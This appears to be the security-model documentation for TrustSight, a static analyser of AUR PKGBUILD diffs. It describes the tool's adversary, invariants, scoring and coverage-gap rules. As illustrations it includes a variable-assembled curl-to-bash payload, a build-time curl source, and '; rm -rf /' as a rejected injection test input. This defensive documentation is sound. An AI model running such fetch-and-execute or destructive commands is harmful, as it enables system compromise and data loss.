---
description: What TrustSight is, what it claims, what it does not claim, and how to report a vulnerability.
---

# Security Model

TrustSight is the **instrument panel, not the airworthiness certificate**.

A quiet panel means no monitored condition tripped its threshold. It does not
mean the aircraft is sound, and it never means you are cleared to fly. What a
panel owes you is two things: every sensor it has reports honestly, and every
sensor it does not have shows up as *missing* rather than dark. A gauge that
reads zero because nothing is wrong and a gauge that reads zero because it was
never wired are the same picture, and telling them apart is the entire job.

So: an **instrument, not a judge**. TrustSight reads AUR PKGBUILD diffs, applies
published detection rules, and reports what it found and what it could not see.
It never decides whether a package is safe. A person does. That distinction -
**input, not verdict** - is the foundation this page is built on, in four
statements the rest of the document makes precise:

- TrustSight reports on evidence, and on the absence of evidence.
- Absence of evidence is never presented as proof of safety.
- The tool's output is input to a human decision, never the decision itself.
- Errors and unknowns travel to the surface; the interface does not hide them.

The page is organised as a thesis (read this first), then the four parts that
make it precise and enforceable:

- **The thesis** (below): adversary, boundaries, assumptions, guarantees,
  non-guarantees, the evidence taxonomy, detection versus authorization, and
  how uncertainty reaches the person.
- **[Part A](#part-a-trustsight-as-a-program-under-attack)**: TrustSight as a
  program consuming hostile input - the invariants that protect the machine.
- **[Part B](#part-b-what-the-result-claims)**: what a result claims about a
  package, and what it does not.
- **[Part C](#part-c-the-enforcement-map)**: every invariant above, mapped to
  the check that fails when it stops being true.
- **[Part D](#part-d-vulnerability-reporting)**: what counts as a
  vulnerability in a static analyser, and how to report one.

Nothing here is aspirational. Every invariant in Part A and Part B has an
executable gate in `scripts/security_gates.py`, run in CI on every push. A claim
without a gate is a claim this project does not make.

---

## The thesis

### The programme

A package update is a moving target: new code, new URLs, new maintainers, new
build logic. TrustSight cannot audit what an update *will do*; it can only audit
what the update *says*. So every analysis walks the same pipeline:

> **Parse** the PKGBUILD into a structured representation, **Analyse** it
> against pattern rules and context signals, **Score** the findings through an
> additive model, with declared practice reported at weight 0, **Classify** the result into a band, and
> **Translate** the findings into a template-based report.

The bands are `Low`, `Medium`, `High`, `Critical` and `Inconclusive`. This page
says FLAGGED for anything above the 20-point threshold, UNFLAGGED for anything
at or below it, and INCONCLUSIVE for the band of the same name; those are
reading conventions for the prose, and `risk` in the JSON carries the band
itself.

The score and its band are computed on every run and shown on request. The
default output is the findings and the change summary: what matched, where, and
what changed. `--score` adds the number and the band; `--json` carries them when
`--score` or `--risk` is passed, because a consumer needs the machine-readable
form.

Computation is local and deterministic: the same input always produces the same
score and the same evidence record. Nothing about the score depends on a remote
service, a model, or a clock TrustSight does not control. Fetching is a separate,
second stage with one destination (`aur.archlinux.org`), described in detail in
[the invariants](#the-invariants).

The thesis is not that this pipeline catches everything. It is the opposite: the
pipeline has published limits, and **those limits are part of the
output**, not a footnote. Everything below follows from that.

### Adversary

The AUR is an unmoderated, user-submitted repository. Anyone can publish, and
whoever maintains a package can modify it at will. TrustSight therefore assumes
the strongest realistic adversary: **someone who controls every byte of every
artifact TrustSight reads about a package, and who knows this source code**. The
full adversary description is in [Part A](#part-a-trustsight-as-a-program-under-attack);
the practical consequence is that every read of package-controlled data is a
potential attack on the machine running the tool, and the threat model is about
that machine surviving contact with hostile input, detection or no detection.

### Boundaries

TrustSight does three things, and only three: it reads, it computes, it reports.

- **Reads** the reviewed repository and the single AUR endpoint.
- **Computes** evidence scores, entirely locally, deterministically, and never
  by executing a PKGBUILD.
- **Reports** findings and their reasons, and what it could not examine.

It does **not** build, run, install, or sandbox. The moment you run `makepkg`,
you are outside this model.

Two of the things it never does are worth stating on their own, because each
removes an attack surface rather than defending one. It never fetches a URL a
package declares, so there is no SSRF primitive to turn a reviewer into a probe.
It never connects to a host a package names; the only host is the literal
`https://aur.archlinux.org`.

### Assumptions

The model above and the parts that follow are claims *about this program*: that
its invariants hold when it runs. They are not claims about the machine it
runs on. Like any model, this one rests on a set of assumptions, and stating
them is what makes the boundary complete: a reader knows exactly where the
analysis stops being the tool's responsibility.

Each of these is taken as given, not defended:

- **The Python runtime is trusted.** The interpreter, its bytecode loader, and
  the standard library are the substrate the analysis runs on. A compromised
  interpreter can do anything the process can.
- **The operating system is trusted.** The kernel, the dynamic linker, and the
  executable the process actually is are outside the model.
- **Local filesystem permissions are trusted.** The files TrustSight reads
  (its own config, the repository, the snapshots) are at the paths the
  operator chose and are readable because the operator's permissions say so.
  A hostile file at a *trusted* path is indistinguishable from a trusted file.
- **The TLS trust store is trusted.** AUR traffic is protected only against a
  network-level attacker; it assumes the certificate authorities in the local
  store are honest and the store has not been altered.
- **CI is not compromised.** The gates are meaningful because the machine that
  runs them is running the code they check, and exercising that code with its
  shipped configuration. A compromised CI is a compromised review, not a
  detectable one.
- **The dependencies are trusted.** `rich`, `pygit2`, `typer`, `tldextract`,
  the Python interpreter and standard library, the `sqlite3` library and the
  SQLite it wraps, and the runtime's own libraries (`libc` and friends) are
  third-party or substrate code this project consumes and does not audit. The
  concrete list is repeated where Part A documents what its program-level
  invariants do not cover. If `rich`, `pygit2`, Python, SQLite, or `libc` is
  compromised, this document no longer applies.

If any of these is not true, this document no longer applies: the guarantees in
Parts A and B are about the program, and the program is only as trustworthy as
the layers beneath it. That is not a gap in the model, it is the model stating
where its border is.

### Guarantees

What the tool promises, in one paragraph, is that its output is honest about
the analysis that produced it. The specifics, each with a gate, are in
Part A and Part B; the short list is:

- **Reproducible**: the same input, the same score and evidence record.
- **Transparent**: every point is attributable to a named entry in the score
  breakdown, and the breakdown is part of the output.
- **Fails closed on doubt**: an analysis that did not see the whole change
  cannot report UNFLAGGED, and its band is marked incomplete wherever a human
  sees it.
- **Not headline-shaped**: the default output is evidence, not a verdict. The
  score exists, is deterministic, and is available on request; it is not what
  the tool leads with, because a number invites a decision the tool is not
  entitled to make.
- **Isolated**: it never fetches a URL the package named, never executes
  package code, never extracts archives to disk, and never renders untrusted
  text unescaped.
- **Locked**: FATAL rules cannot be turned off, and suppression is always
  visible.
- **Calibrated**: detection fire rates against a published benign corpus are
  measured and enforced by the calibration gates.

Each of these stops being a promise the moment the machine breaks it. The gates
in [Part C](#part-c-the-enforcement-map) are what turn them from sentences into
structural commitments.

### Non-guarantees: absence of alerts is not a certificate

An UNFLAGGED result means "no published rule matched the evidence that was
actually examined". That is a statement about *detection* alone. It is not the
same as "no attack is possible", and it is not, on its own, an instruction to
update.

This is the danger edge because it is where the panel is easiest to misread. An
alarm you cannot see is as bad as no alarm at all, so the one light that must
never be suppressible is the "I did not watch that" light. Everything in
[B2](#b2-an-unflagged-verdict-is-never-issued-for-an-analysis-that-was-incomplete)
exists to keep that light lit.

A quiet panel still shows the readings. TrustSight reports what changed even
when no rule matched, because a panel that goes blank when all is well is
indistinguishable from one that has been switched off.

Concretely, an UNFLAGGED result does **not** claim:

- that the package is safe (only that no published rule matched what was
  examined);
- that the ruleset is complete (fire rates and gaps are published; detection
  has documented ceilings);
- that runtime behaviour was observed (nothing is executed);
- that the build will fetch what the recipe says (where that cannot be
  determined statically, the result is downgraded).

What it *does* do is tell you exactly which sensors tripped, which sensors are
missing, and what was never examined - so the weight of the decision is yours,
not the tool's. See [Part B](#part-b-what-the-result-claims) for the precise claims.

### The evidence taxonomy

Every result reduces to one of four places in a taxonomy, and the taxonomy has
to be stated completely, because the tool's trustworthiness is exactly its
refusal to move between them silently:

| What the tool has | Example | How it is presented |
|-------------------|---------|---------------------|
| **Known risk** | a rule matched (e.g. R013 confusable unicode) | FLAGGED, with the matching rule, file and line |
| **Declared safe evidence** | checksums declared, PGP keys declared, commit pinned | INFO, reported, never scored (B10) |
| **Evidence that is contextually uncertain** | a `source=` URL computed at build time; a file the manifest did not list | **INCONCLUSIVE** |
| **None known** | history too short to trust novelty at full weight | **INCONCLUSIVE** until warm |

The last two rows are the ones most tools are tempted to collapse into "nothing
found", which is exactly the error the thesis forbids. A concrete form: the
`unresolved_source` gap - a `source=` entry computed at build time, say
`_url="$(curl ...)"` - means the URL the build will actually fetch is not in the
analysed text. The tool records the gap, reports
INCONCLUSIVE, and tells you the URL was never statically confirmable. The
details of the taxonomy live in [evidence tiers](reference/evidence-tiers.md)
and [what TrustSight cannot see](explanation/what-trustsight-cannot-see.md).

### Detection and authorization

Detecting is not authorizing. They are different acts, and a tool that lets the
first quietly stand in for the second is making the exact substitution this
model rejects.

- **Detection** is what TrustSight does: rules fire, scores compute, gaps are
  recorded. Its output is *input*.
- **Authorization** is what a person does: someone decides whether to update,
  to click, to merge. The tool does not perform that action, and no synthesized
  sentence from the tool performs it either.

The boundary does not disappear in CI, it moves. A pipeline still authorizes,
it just does so in advance: the pipeline owner writes the decision into a gate
(for example, the UNFLAGGED check **and** the coverage check), and that decision
is theirs, stated in their own script, where it can be read and argued with. The
tool supplies evidence and unknowns; a person decides what they are worth.
Human-in-the-loop is not a slogan here, it is the operating principle: **no
verdict, however emphatic, is an authorization to act.**

### Uncertainty reaches the surface

The whole model stands on one interface rule: **every unknown the tool
recorded must be visible to the person it matters to, and it must never be
hidden by default**.

- A coverage gap appears in the JSON and on the terminal, and is never dropped
  from either.
- A result that could not be examined fully is not shown as a bare "Low":
  for a human render the band is qualified, e.g. `High (incomplete analysis)`,
  and for machines `risk` and `coverage_gaps` are separate fields (see [report
  schema](reference/report-schema.md)).
- An analysis that failed for a tracked package is reported as "this package
  was NOT vetted", so a skipped package cannot read as an unflagged one.
- A result reports the changes it examined, not only the rules that fired. An
  update with no findings still tells you what moved, so "nothing fired" cannot
  read as "nothing happened".
- A failure is reported as a failure and never absorbed into a result. The
  exit code distinguishes "the analysis ran" from "the analysis could not run",
  and says nothing about what was found.

Part A states the invariants that protect the machine, Part B the limits on
what a result may claim, and Part C maps every one of them to a gate. The
taxonomy is the theory; the rest of this page is the enforcement.

---

## Part A: TrustSight as a program under attack

### The adversary

TrustSight reads PKGBUILDs from the AUR. The AUR is an unmoderated,
user-submitted package repository: anyone can publish, and a package can be
modified by whoever maintains it. So the model assumes the strongest realistic
adversary for this position:

**The attacker controls, entirely and with foreknowledge of this source code,
every byte of every artifact TrustSight reads about a package.** That includes
the PKGBUILD, the `.install` hook, every other file in the repository, the
package name, the maintainer name, the version strings, the commit metadata,
the commit timestamps, and the AUR metadata entry.

The attacker also knows which rules exist, what they match, and what they do
not. Detection is calibrated, published, and therefore evadable; see
[what TrustSight cannot see](explanation/what-trustsight-cannot-see.md). Part A
is not about whether an attack is detected. It is about what the attacker can
do to the *machine running TrustSight*, and the answer must be "nothing",
detection or no detection.

### The trust boundary

| Input | Trusted? | Why |
|-------|----------|-----|
| PKGBUILD, `.install`, repository tree, package and maintainer names, versions, commit metadata | **No** | Written by the party under review. |
| The AUR metadata dump and the git repository at `aur.archlinux.org` | **Transport only** | The host is fixed and reached over TLS. Its *contents* are attacker-authored and are treated as hostile input. |
| `config.toml`, `rules.toml`, `hosts.toml`, `patterns.toml`, `naming.toml`, `thresholds.toml`, `iocs.toml`, `overrides.toml` | **Yes** | Local files owned by the operator. Editing them is a supported way to tune the tool. |
| The bundled novelty seed | **Yes, narrowly** | Ships inside the package, so it is as trusted as the install itself. What it is allowed to change is bounded anyway; see below. |
| A seed or baseline given on the command line | **Operator's decision** | Passing a path is an explicit act of trust. The baseline importer verifies a signature; the seed importer records the digest of what was imported. |
| A file in the current working directory | **No** | Nothing is read from a relative path. Config and snapshots resolve under the config directory. |

### The invariants

**A1. The input is not code.** There is no `eval`, no `exec`, no `os.system`, no
`shell=True`, and no unpickling anywhere in the source. Subprocesses are spawned
only to ask the local `pacman` about installed packages and to compare versions
with `vercmp`. Argument lists are always a list, never a string, so there is no
shell to inject into.

`vercmp` deserves stating out loud, because it is the one place in A1 the
guarantee is a validation rather than a structural property. `pacman` calls
take `--` to end option parsing. `vercmp` has no `--`, and its two arguments are
version strings that came from the AUR, so they are attacker-influenced: a
package publishing the version `-h` would otherwise put a flag on a command line.
The guard is therefore the shape of the argument, checked before the spawn:

```python
_VERSION_ARG_RE = re.compile(r"^[A-Za-z0-9._+~:][A-Za-z0-9._+~:-]*$")
```

A pacman version is `[epoch:]pkgver[-pkgrel]`, so the permitted set is letters,
digits, and `. _ + ~ : -`, and the first character may not be `-`. Anything that
fails this never reaches a command line: it is compared in-process by
`_simple_vercmp` instead. When `pyalpm` is installed, no subprocess is spawned at
all and the comparison happens in-library.

The residual risk is that the shape check is an allowlist, and an allowlist can
be wrong. It is tested against both directions (real versions like
`1:1.1.1w-1` must pass, `-h`, `--help`, `; rm -rf /` and the empty string must
fail), and passing it buys an attacker one `vercmp` argument out of a character
set with no shell metacharacters in it.

**A2. The URLs a package declares are never fetched.** Downloading what a
PKGBUILD points at would make every reviewer an SSRF probe, would tell the
attacker exactly who is inspecting them, and would turn a review into a
denial-of-service amplifier. The analysis package imports no transport at all,
so this cannot be reintroduced by accident.

**A3. One network host.** Every endpoint is a literal `https://aur.archlinux.org`
constant: the RPC, the metadata dump, the git clone, and cgit. TrustSight never
connects to a host named by the package under review. The analysis itself is
local and deterministic, as the thesis describes; fetching is a separate stage,
with one destination.

**A4. Every read is bounded.** Every request has a timeout. Every response has a
byte cap. Decompression is capped before it is materialised, tar members are
walked lazily with a ceiling, the seed import refuses to expand past its limit,
and the diff is truncated at a configured size. A remote end never decides how
much of this machine's memory or time to use.

`full-aur` and `full-aur --watch` change the *volume* of this, not its shape.
A watch loop makes many requests to the one host in A3 over hours or days, so
the bounds above are per-request and the loop adds two of its own: a configured
interval with a 60-second floor, and an optional cycle count. Each cycle is an
ordinary analysis; nothing about running on a timer relaxes A1 through A13.

There is deliberately **no hook, callback, or notification command**: nothing in
TrustSight spawns an operator-supplied program, with or without findings on
stdin. That is worth stating because it is a natural thing to want from a watch
loop, and a natural thing to add carelessly. If it is ever added it belongs in
this part with its boundary written down, because such a hook would receive
attacker-influenced JSON (package names, maintainer names, quoted evidence) and
the operator's script would own what happens next. Today the only subprocesses
are the `pacman` and `vercmp` calls in A1.

**A5. Matching is bounded, and the bound is recorded.** Rule patterns are
regexes running over attacker-written text, so the input is clamped to
`rules.MAX_RULE_LINE_BYTES` (8 KiB) per line before matching. That bounds every
pattern at once, including ones added later, in a way that no per-pattern audit
can.

The clamp applies to both rule engines. The patterns in `rules.toml` go through
`apply_rules`; the larger set emitted from `analysis/` matches the diff text
directly, and `rules.clamp_text` bounds that text before it gets there. That
distinction is not cosmetic: while only the first was clamped, one 5 MiB line
cost 0.17s through `apply_rules` and 15s through the code-emitted rules.

A clamp is also a truncation seam: a payload placed past byte 8192 of a single
line is not matched. A bound that silently drops content is exactly the class of
skip B2 exists to prevent, so it does not stay silent. A diff containing any
over-length line records the `line_truncated` coverage gap, and everything in B2
then applies: the run cannot report UNFLAGGED, and the gap is shown with the
band.
Lines are joined across backslash continuations before this is measured, so the
limit applies to the logical line an attacker actually controls.

**A6. Expansion is bounded and never indirect.** The tokenizer resolves shell
variables so that a payload assembled from `C=curl; $C evil | bash` still
reaches the rules. That makes it the second parser eating hostile input, and the
one with an amplification property the regex engine does not have: `b=$a$a`
doubles per level, so a chain of them grows as `2**depth`, and a 517-byte
PKGBUILD was once enough to OOM the process. Four bounds apply:
`_MAX_EXPANSION_PASSES` (16 rewrites, each resolving one innermost `${...}`),
`_MAX_VALUE_LEN` (8 KiB for one value), `_MAX_LINE_LEN` (64 KiB for one resolved
line), and `_MAX_TABLE_BYTES` (1 MiB for the variable table as a whole).

The important half is what happens at the bound. **A value that would exceed the
bound is left unexpanded and never truncated.** An unexpanded `$payload` is
reported as an unresolved pattern; a truncated one would look like a fully resolved
string with its tail quietly removed, which is the same failure mode as A5's
seam and is refused for the same reason.

Two forms are never resolved at all: indirect expansion `${!name}`, which would
let a value choose which variable is read, and length `${#name}`. Both return
unresolved rather than a guess.

**A7. Rendering data is data.** A finding's plain-English text is a template
keyed by rule id, filled with named fields from the finding's evidence. Field
values are substituted, never re-expanded and never evaluated: a value with
`{0.__class__}` renders as those characters. No template is ever drawn from
package-controlled text, and a template missing a field falls back to the
finding's reason instead of raising, so one malformed finding cannot abort a
batch.

Verdicts used to be rendered through a language model. They are not any more,
and that is a security property rather than a refactor: rendering now has no
network dependency, no nondeterminism, and **no prompt-injection surface in the
output path**. R012 still detects injection aimed at whoever reads the diff,
because the target of that attack is the human reviewer and always was. What
changed is that TrustSight itself no longer has a model for a package to talk
to.

**A8. Archives are never extracted.** Snapshot tarballs are walked in memory,
member by member, and no path from an archive is ever written to disk. There is
no path-traversal surface because there is no extraction.

**A9. SQL is parameterised.** Every value reaches SQLite as a bound parameter.
The only interpolation into statement text is an identifier drawn from a literal
list in the same module, because SQLite cannot bind a table name.

**A10. Output is inert.** Package names, maintainer names, file paths, and quoted
evidence are attacker-controlled and are printed to a terminal. Before rendering,
they pass through `trustsight.safe_text.clean`, which removes ANSI and OSC escape
sequences, C0 and C1 control bytes, and DEL, and through `safe_markup` where the
value is interpolated into Rich console markup. A package cannot repaint the
screen to forge a verdict, cannot recolour a row, and cannot abort the render of
a batch with an unbalanced markup tag. Stored evidence and JSON output are left
byte-exact: sanitising happens at the point of rendering, not in the analysis.

**A11. Unless a local marker says otherwise, age is local.** A
maintainer-supplied timestamp cannot convince the tool that a stale local copy
is current; recency is anchored to a local marker.

**A12. A seed cannot rewrite the database.** The novelty seed is additive and
can never overwrite a row learned from a real analysis, only set the two
metadata keys it owns, and cannot raise a locally learned maintainer count. Its
SHA-256 and origin are recorded on import. It can only make something look
*more* familiar, which can lower a novelty flag but can never raise a score.

**A13. A baseline supplies state, not rules.** A corpus baseline is a larger
version of the same trust decision. It is signature-verified against a pinned
public key, its metadata snapshot rides outside the signed payload and is
re-hashed against the signed hash on import (so a validly-signed artifact cannot
be re-published with someone else's AUR metadata attached), and an unsigned
import requires `--allow-unsigned` and is logged as local-only.

The bound matters more than the signature, because a signature says who built the
artifact, not that the contents are honest. A baseline writes exactly three
things: package profiles, PKGBUILD snapshots, and the metadata snapshot. It
cannot change a rule, a pattern, a severity, a weight or a threshold, and it
executes nothing. So the worst thing a hostile-but-validly-signed baseline can
do is A12's attack at corpus scale: supply a prior that makes the present look
unexceptional, reducing novelty and longitudinal signals across many packages
at once. What it cannot do is make a rule stop matching. Import a baseline from
a corpus you would trust.

### What this part does not protect

- **Building the package.** TrustSight never runs a PKGBUILD. Once you type
  `makepkg`, you are outside this model entirely.
- **The dependencies TrustSight itself installs.** `pygit2`, `rich`, `typer`
  and `tldextract` are third party code in this process. The PSL data
  `tldextract` uses is pinned and read offline, but the libraries are a supply
  chain this project consumes and does not audit. SQLite is trusted the same
  way: every value reaches it through a parameterised statement (A9), but a
  compromised SQLite is a compromised database, and this model assumes it is
  not. The complete dependency boundary is stated in
  [the thesis assumptions](#assumptions).
- **TrustSight's own distribution.** TrustSight ships as an AUR package, built
  from a fixed tag with a checksum in the recipe. It is subject to the same
  threat it describes. Verify the tag.

---

## Part B: What the result claims

A TrustSight result is an assertion about **evidence found in a diff**, not a
statement about whether a package is safe. The distinction is the whole model,
and every clause below is a limit on the claim.

### B1. A score is a sum of matched evidence, nothing more

The score is deterministic: the same input always produces the same number and
the same breakdown. It is not a probability, not a confidence, and not a
prediction. A score of 0 means "no published rule matched the evidence
examined", which is exactly as strong as the rule set is, and no stronger. The
score is computed on every run so that `--score`, `--json`, coverage logic and
CI gating all see the same value: determinism does not depend on how it is
displayed.

### B2. An unflagged verdict is never issued for an analysis that was incomplete

Four things make a run partial, and all four are recorded as **coverage gaps**
on the result:

| Gap | Meaning |
|-----|---------|
| `diff_truncated` | The diff exceeded `[diff] max_diff_bytes`, so only its prefix was examined. |
| `line_truncated` | A logical line exceeded `rules.MAX_RULE_LINE_BYTES`, so its tail was not matched against any rule (A5). |
| `tree_not_analyzed` | The repository file manifest was unavailable, so only the PKGBUILD was examined. |
| `unresolved_source` | A `source=` entry is computed at build time, so the URL the build will actually fetch is not in the analysed text. |

A gap adds no points: it is not evidence about the package, and scoring it would
corrupt the calibration. What it does is constrain how the result may be
presented, in two ways that work together.

**First, a gap forbids an unflagged verdict.** A run with any gap and no HIGH or
worse finding is reported as **Inconclusive**, never as Low or Medium. This
closes a bypass that was previously documented and undefended: padding a diff
past the size cap and appending the payload used to turn a High into a Low,
which let an attacker's evasion read as "looks fine".
The taxonomy explains why: a gap is a missing sensor, and a missing sensor is a
signal that must reach the panel.

**Second, a gap always travels with the band.** A HIGH, CRITICAL or FATAL finding
does keep its band, because hiding a confirmed finding behind "inconclusive"
would lose the thing that matters most. The seam is defined, because an
attacker's move is obvious once the rules are published: pad the diff past the
cap, put the real payload after the cut, and include one cheap deliberate HIGH
in the visible prefix. The verdict then reads "High", which is a
confident-looking answer, and the reviewer's attention lands on the decoy
instead of the fact that most of the change was never read.

So no human-facing render ever shows a bare band for an incomplete run; the band
is qualified wherever it appears:

```
Score: 75/100 (High (incomplete analysis))
```

and the gap itself is listed, naming which part was not examined. `Inconclusive`
is not qualified, because it already says the same thing.

Default does not mean optional. Hiding the band by default must not become a way
to skip the qualification when `--score` is passed: the moment a band is shown,
it is shown qualified.

Machine output keeps the two facts separate rather than in a sentence: `risk`
is the bare band, `coverage_gaps` is the list, and `risk_label` is the
qualified string for consumers that want to display it. **A consumer gating on
`risk` alone, without reading `coverage_gaps`, reintroduces the seam.** That is
stated in [using TrustSight in CI](guides/using-in-ci.md), which treats a
non-empty `coverage_gaps` as blocking.

**Where the threshold comes from.** UNFLAGGED is at or below 20 points
(`scoring.FLAG_THRESHOLD`). The number is stated here because a reader cannot
otherwise tell whether it is measured or chosen, and the honest answer is: it
was measured, then the measurement moved underneath it.

Twenty was originally the 95th percentile of the benign corpus. It is not any
more. Against the 3,246-diff corpus as currently calibrated:

| Measure | Value |
|---------|-------|
| benign median | 0 |
| benign 95th percentile | 45 |
| benign diffs scoring 0 | 69.1% |
| benign diffs above 20 | 16.3% |
| percentile that 20 now sits at | 83.7th |
| malicious 5th percentile | 60 |
| malicious minimum | 40 |

So about one benign diff in six lands above the threshold. That is a direct and
intended consequence of
[B10](#b10-positive-evidence-is-reported-never-credited): declared checksums,
PGP keys and trusted-forge hosting used to subtract up to 25 points, and no
longer subtract anything, so packages that previously bought their way under 20
now sit above it.

The property the calibration gates actually enforce is the one that matters for
separation: **benign p95 (45) stays below malicious p5 (60)**. The margin was 25
before B10 and is 15 now. Twenty remains the published threshold because moving
it is a calibration decision with its own evidence, not a bookkeeping fix to
keep a sentence true.

Be precise about what is automated here. `scripts/calibration_gates.py`
re-computes **benign p95 and malicious p5 on every push** and fails the build if
they cross. The other figures in the table above are a point-in-time
measurement, not a per-push one; they are published in
[fire rates](explanation/fire-rates.md) and have to be re-derived with
`scripts/rebaseline.py` when scoring changes. A number in this table is only as
current as the last person who ran that script.

### B3. Inconclusive is not presented as UNFLAGGED

`Inconclusive` is produced in two situations:

1. The score landed in the Medium band (21 to 50), `maturity()` is below 0.5,
   and no HIGH, CRITICAL or FATAL entry is in the breakdown. Maturity ramps
   linearly to 1.0 at `scoring._MATURITY_THRESHOLD` observations, which is
   **50**, so "below 0.5" means **fewer than 25 recorded analyses** for that
   package. See [cold start and maturity](explanation/cold-start-and-maturity.md).
2. The analysis had a coverage gap, per B2. This applies at any maturity.

In both cases the tool is saying it could not form a picture, not that the
picture is good.

### B4. FATAL cannot be switched off

A FATAL finding caps the score at 100 and is never suppressible, whichever of
the two surfaces tries:

- **At the finding surface.** A FATAL finding is never suppressed by an
  override, whatever `overrides.toml` says. `add_override` refuses to create
  such an override, and the filter ignores one added by hand.
- **At the rules surface.** A FATAL rule this build ships cannot be removed or
  downgraded by editing `rules.toml`. If the on-disk file drops it or lowers
  its severity, the shipped definition is used for the run and a warning is
  logged. Nothing is written back - your file stays your file, you just do not
  get an analysis that pretends the rule was never there.

The protected set is derived from the shipped rules, not hardcoded in this page.
Today it is **R012** (prompt injection) and **R013** (unicode deception). R106 at
its confirmed tier also reaches FATAL and is emitted from code rather than from
`rules.toml`.

The reason these two in particular are locked: the payload targets the
*reviewer*, not the machine. A run that skips them is not a tuned run, it is a
run whose output cannot be trusted at all.

### B5. Suppression is always visible

A suppressed finding is returned and reported, never discarded. A silent
suppression is indistinguishable from a missed detection, and those two must
never look the same to a reviewer: one means a rule was switched off on
purpose, the other means the tool failed.

### B7. A result reports what changed, not only what fired

A report made only of findings cannot distinguish "nothing fired and nothing
changed" from "nothing fired and a great deal changed". Absence of alerts then
reads as absence of change, which is the collapse the taxonomy already forbids
one layer down.

Every result carries a **change summary** beside its findings: the declared
facts about what the diff did, whether or not a rule matched. Version moves,
checksum behaviour, files added, removed or renamed, dependency changes,
maintainer changes, source host changes, and the no-change case
(`no changes in the AUR since last review (commit 8646e821)`). `.SRCINFO` and
`.gitignore` are suppressed: they regenerate on nearly every bump, and listing
them trains the reader to skim the section.

Change entries are **not findings**. They carry no severity, no points, and
never appear in `triggered_rules`; conflating the two would corrupt both the
calibration and the reader's sense of what a finding is. In JSON they are a
separate `changes` array, sibling to `findings` and `coverage_gaps`, so a
consumer reading only `findings` is unaffected.

### B8. A finding is checkable

Every finding that matches file content carries `file` and `line`. A finding the
reader can open and confirm in five seconds is a different object from an
assertion they must trust, and that is the difference between an instrument
reading and an opinion.

Rules that legitimately cannot report a location (maintainer, temporal, graph,
corpus) declare an **evidence class** instead, in `findings.NON_CONTENT_RULES`.
Silently omitting the field is not permitted: a missing location must not be
indistinguishable from a rule that forgot to set one.

### B9. No output grants permission to skip review

No rendered output states or implies that reading the diff is unnecessary,
**including when nothing fired**. The trivial case states a fact, it does not
issue a clearance:

```
some-pkg 1.2.3 -> 1.2.4
  Only pkgver and sha256sums changed.
  Review the diff before building.
```

Forbidden: "clean", "safe", "no issues", "looks fine", "nothing to review", or
any phrasing whose plain reading is *you may proceed*. Enforced as a denylist
over the rendering templates, so it costs nothing at runtime and fails the build
when someone adds a friendly-sounding string.

This belongs in Part B rather than being a style note. The rest of Part B bounds
what a *score* may claim; this bounds what the *prose* may claim, and the prose
is what most readers act on. An UNFLAGGED band with a reassuring sentence beside
it defeats B6 regardless of what B6 says.

### B10. Positive evidence is reported, never credited

Verification and hardening signals (declared checksums, `validpgpkeys`, GPG
signature sources, pinned commits, trusted-forge sources) are emitted as **INFO
findings with weight 0** in the `P` namespace. They appear in the report and in
`findings`. They do not enter the score in either direction.

**Why weight 0 rather than a credit.** Everything TrustSight sees is
attacker-declared. Adding `validpgpkeys=(...)`, pinning a `#commit=`, or routing
through github.com costs an attacker nothing, and TrustSight never fetches, so it
never confirms that a declared key signs anything or that a pinned commit
contains what it claims. A signal an attacker can trivially assert must not be
able to lower a score: the only reliable effect of such a mechanism is buying
points back for whoever bothers to read the rules.

Reporting it is still worth doing. The reader can verify these claims in ways
TrustSight cannot, and "this package declares GPG verification" is genuinely
useful context for a human decision. That is the division of labour the whole
model rests on.

They are called **declared-practice findings**, not benign rules. They do not
establish that anything is benign; they report that the recipe declares a
practice.

**What this replaces.** Earlier versions applied subtractive weights
(`checksum_present` -10, `validpgpkeys_declared` -10, `gpg_verify_present` -5,
`checksum_pinned` -5, `tag_pinned` -3, trusted forge -10 capped at -20). Those
are removed. The calibration problem they solved, a package doing GPG
verification scoring worse than one doing nothing because SKIP on a `.asc` file
added points, is fixed at source instead: R004 does not fire on a SKIP that is
mandatory for a VCS source, structurally uncheckable for a signature file, or
covered by declared PGP keys. The right fix was to stop the false positive, not
to pay it back.

**Presentation.** They render in their own group, visually distinct from risk
findings and never as a running total:

```
Declared verification
  PKGBUILD:24   validpgpkeys declared
  PKGBUILD:22   checksums declared for all non-VCS sources
  PKGBUILD:11   source pinned to a full commit hash

  TrustSight does not verify these claims. It reports that the recipe makes them.
```

That last line is not a disclaimer, it is the finding's actual content. Without
it the group reads as a safety certificate, which is the failure this page
exists to prevent.

Not all of them are emitted every time. Seventeen INFO lines on every package
buries the risk findings, which is the opposite of what the group is for, so the
default set is the ones a reader would find surprising by their absence and the
rest render under `--verbose`.

Declared practices that depend on corpus or longitudinal state follow the same
cold-start discipline as their risk-side counterparts: silent when there is no
history, never reporting "unchanged since first observation" when the answer is
"nothing observed yet". Those are also the ones an attacker cannot fake cheaply:
`validpgpkeys` can be added in a single commit, two years of stable
maintainership in your local database cannot.

### B6. What a result does not claim

- **It does not claim the package is safe.** It claims no published rule matched
  the evidence it examined. An UNFLAGGED result is a *detection outcome*, not a
  certificate - absence of alerts is not a statement about airworthiness.
- **It does not claim the ruleset is complete.** Fire rates and known gaps are
  published in [fire rates](explanation/fire-rates.md) and enforced by
  `scripts/calibration_gates.py`. Detection has documented ceilings.
- **It does not claim runtime behaviour was observed.** Nothing is executed.
- **It does not claim the build will fetch what the recipe says.** Where that
  cannot be determined statically, B2 applies.
- **The exit code is not a verdict.** `trustsight review` exits 0 when the
  analysis completed and 2 when it could not. A package that flags is reported
  in the output, not in the exit status. Gate CI on the JSON, as [using
  TrustSight in CI](guides/using-in-ci.md) shows.

---

## Part C: The enforcement map

Each row is one invariant, the gate that proves it, and where the behaviour
lives. Run them all with:

```bash
python scripts/security_gates.py
```

An exit code of 1 means a claim on this page has stopped being true.

| Gate | Invariant | Implementation |
|------|-----------|----------------|
| `no interpreter or shell execution` | A1 | source-wide AST scan |
| `version arguments are shape-checked` | A1 | `discovery._VERSION_ARG_RE` |
| `network confined to the fetch modules` | A2, A3 | `discovery.py`, `fetcher.py`, `full_aur/fetch.py`, `full_aur/metadata.py` |
| `declared source URLs are never fetched` | A2 | `src/trustsight/analysis/` imports no transport |
| `one network host, declared` | A3 | endpoint constants |
| `every request has a timeout` | A4 | `urlopen` call sites |
| `rule matching is bounded on hostile input` | A5 | `rules.MAX_RULE_LINE_BYTES` |
| `expansion is bounded and never indirect` | A6 | `tokenizer.py` |
| `report rendering is data-driven` | A7 | `verdict.py`, `findings.py` |
